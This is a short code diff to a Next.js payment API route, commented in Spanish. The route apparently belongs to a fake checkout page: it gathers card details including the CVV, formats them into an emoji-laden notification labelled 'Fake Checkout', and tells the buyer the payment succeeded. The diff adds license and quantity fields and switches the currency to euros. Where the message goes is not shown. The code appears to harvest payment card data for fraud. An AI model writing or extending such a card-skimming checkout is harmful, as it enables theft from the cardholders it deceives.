@@ -1,5 +1,8 @@
 import { NextRequest, NextResponse } from "next/server";
 
+// Forzar que esta ruta sea dinámica (no estática)
+export const dynamic = 'force-dynamic';
+
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
@@ -27,6 +30,8 @@ export async function POST(request: NextRequest) {
       
       // Pago
       product,
+      license,
+      quantity,
       amount,
     } = body;
 
@@ -75,7 +80,9 @@ CVV: ${cvv || "No proporcionado"}
 💰 DETALLES DEL PAGO
 ━━━━━━━━━━━━━━━━━━━━
 Producto: ${product || "Fake Checkout"}
-Monto: $${amount || "0.00"}
+Licencia: ${license || "No especificada"}
+Cantidad: ${quantity || "1"}
+Monto: €${amount || "0.00"}
 Fecha: ${fechaActual}
 
 ✅ Estado: Pago procesado exitosamente`;
